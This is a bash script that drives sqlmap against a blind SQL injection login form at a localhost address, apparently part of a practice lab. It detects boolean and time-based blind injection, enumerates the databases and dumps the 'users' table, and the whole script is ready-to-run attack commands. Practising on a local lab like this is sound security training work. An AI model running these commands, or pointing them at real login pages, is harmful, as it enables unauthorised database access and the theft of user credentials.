#!/usr/bin/env bash

echo "=== Using sqlmap on blind login form ==="
echo ""

if ! command -v sqlmap &> /dev/null; then
    echo "sqlmap not found!"
    echo "Install: sudo apt install sqlmap"
    exit 1
fi

TARGET="http://localhost:8082/blind/login"

echo "Target: $TARGET"
echo "Testing for boolean/time-based blind SQL injection..."
echo ""

sqlmap -u "$TARGET" \
  --data="username=admin&password=test" \
  --batch \
  --risk=2 \
  --level=3 \
  --technique=BT \
  --ignore-code=401

echo ""
echo "=== Enumerating databases (blind) ==="
sqlmap -u "$TARGET" \
  --data="username=admin&password=test" \
  --dbs \
  --batch \
  --ignore-code=401

echo ""
echo "=== Dumping users table (blind) ==="
sqlmap -u "$TARGET" \
  --data="username=admin&password=test" \
  -D public \
  -T users \
  --dump \
  --batch \
  --ignore-code=401